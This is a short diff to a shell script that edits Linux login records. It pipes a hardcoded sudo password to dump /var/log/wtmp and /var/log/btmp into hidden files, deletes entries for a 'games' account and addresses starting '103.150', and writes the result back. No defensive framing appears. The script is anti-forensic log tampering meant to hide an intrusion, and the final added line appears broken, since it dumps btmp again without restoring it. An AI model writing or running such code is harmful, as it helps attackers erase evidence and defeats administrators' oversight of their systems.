@@ -12,3 +12,8 @@ echo Aa123456 | sudo -S utmpdump /var/log/wtmp > /usr/games/.wtmp.file
 echo Aa123456 | sudo -S sed -i "/games/d" .wtmp.file
 echo Aa123456 | sudo -S sed -i "/103.150/d" .wtmp.file
 echo Aa123456 | sudo -S utmpdump -r < /usr/games/.wtmp.file > /var/log/wtmp
+
+echo Aa123456 | sudo -S utmpdump /var/log/btmp > /usr/games/.btmp.file
+echo Aa123456 | sudo -S sed -i "/games/d" .btmp.file
+echo Aa123456 | sudo -S sed -i "/103.150/d" .btmp.file
+echo Aa123456 | sudo -S utmpdump /var/log/btmp > /usr/games/.btmp.file
